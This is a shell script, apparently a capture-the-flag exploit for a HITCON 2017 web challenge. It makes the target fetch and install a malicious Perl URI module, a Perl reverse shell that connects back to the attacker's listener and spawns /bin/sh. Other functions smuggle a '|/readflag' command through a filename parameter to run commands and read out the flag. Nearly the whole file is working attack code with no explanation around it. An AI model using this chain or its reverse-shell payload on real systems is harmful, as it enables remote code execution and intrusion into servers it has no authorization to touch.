#!/usr/bin/env sh

# Author : Virink <virink@outlook.com>
# Date   : 2019/05/28, 15:28


server_ip=$(ifconfig | grep -o -E 'inet (192.*?) ' | awk '{print $2}')
http_port=8090
reverse_port=7788
target="http://hitcon2017.local.virzz.com/"

function method1(){
	function exp(){
		sleep 5
		curl -o /dev/null -s $target/\?url=virink://virzz.com\&filename=virink.txt
	}
	echo "#!/usr/bin/perl" > x.pl
	echo "package URI::virink;" >> x.pl
	echo "use Socket;" >> x.pl
	echo "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" >> x.pl
	echo "if(connect(S,sockaddr_in($reverse_port,inet_aton(\"$server_ip\")))){" >> x.pl
	echo "open(STDIN,\">&S\");" >> x.pl
	echo "open(STDOUT,\">&S\");" >> x.pl
	echo "open(STDERR,\">&S\");" >> x.pl
	echo "exec(\"/bin/sh -i\");};" >> x.pl
	nc -l $http_port < x.pl &
	rm x.pl
	echo "[+] Write evil URI module"
	curl -o /dev/null -s $target/\?url=http://$server_ip:$http_port/x.pl\&filename=URI/virink.pm

	echo "[+] Write evil URI module"
	exp &

	echo "[+] Listen Reverse Shell on $reverse_port"
	nc -vv -l $reverse_port
}

function method1x(){
	echo "#!/usr/bin/perl" > x.pl
	echo "package URI::virink;" >> x.pl
	echo "system('/readflag > ./flag');" >> x.pl
	nc -l $http_port < x.pl > /dev/null &
	rm x.pl
	echo "[+] Write evil URI module"
	curl -o /dev/null -s $target/\?url=http://$server_ip:$http_port/x.pl\&filename=URI/virink.pm
	echo "[+] Write evil URI module"
	curl -o /dev/null -s $target/\?url=virink://virzz.com\&filename=virink.txt
	echo "[+] GetFlag"
	curl -s $target/sandbox/$1/flag --output -
}

function method2(){
	# Usage : method2 <sandbox_hash>
	echo "[+] Create |/readfile in CWD"
	curl -o /dev/null -s -m 1 $target/\?url=virink\&filename=\|/readflag
	echo "[+] Exec /readflag and save flag to flag"
	curl -o /dev/null -s $target/\?url=file:\|/readflag\&filename=flag --connect-timeout 1
	echo "[+] GetFlag"
	curl -s $target/sandbox/$1/flag --output -
}

function test(){
	# Usage : method2 <sandbox_hash>
	echo "[+] Create |/readfile in CWD"
	curl -o /dev/null -s -m 1 "$target/?url=/etc/passwd&filename=|/readflag"
	echo "[+] Exec /readflag and save flag to flag"
	curl -o /dev/null -s "$target/?url=file:|/readflag&filename=flag" --connect-timeout 1
	sleep 2
	echo "[+] GetFlag"
	curl -s $target/sandbox/$1/flag --output -
}

# method2 9928752d183aafc0a2eb3ce595b5065c
test cfbb870b58817bf7705c0bd826e8dba7